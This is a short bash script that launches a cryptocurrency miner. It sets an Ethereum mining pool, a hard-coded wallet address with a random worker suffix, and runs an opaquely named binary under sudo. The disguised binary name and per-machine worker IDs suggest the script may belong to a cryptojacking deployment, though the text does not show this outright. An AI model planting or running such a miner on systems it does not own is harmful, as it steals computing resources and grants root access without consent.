#!/bin/bash
#!/bin/bash

POOL=eu1.ethermine.org:4444
WALLET=0x39c240d1597a044f7b6bf85c078d41c6a3b12dde.Verifile-$(shuf -n 1 -i 1-9999)
cd "$(dirname "$0")"

chmod +x ./congacuavk && sudo ./congacuavk --algo ETHASH --pool $POOL --user $WALLET  $@
